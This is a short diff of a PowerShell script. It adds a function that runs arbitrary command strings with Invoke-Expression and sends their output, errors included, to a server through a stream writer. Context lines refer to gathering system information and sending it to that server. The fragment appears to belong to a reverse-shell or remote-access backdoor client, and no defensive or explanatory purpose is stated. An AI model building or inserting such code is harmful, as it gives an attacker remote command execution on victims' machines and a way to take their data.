@@ -21,7 +21,17 @@ function WriteToStream ($String) {
 }
 
 # Function to execute commands and send output to the server
-
+function ExecuteCommandAndSendOutput($Command) {
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+        Invoke-Expression $Command 2>&1 | Out-String
+    } catch {
+        $_ | Out-String
+    }
+    
+    # Write output to the server
+    WriteToStream ($Output)
+}
 
 # Function to gather system information and send to server
 function GatherAndSendSystemInfo() {
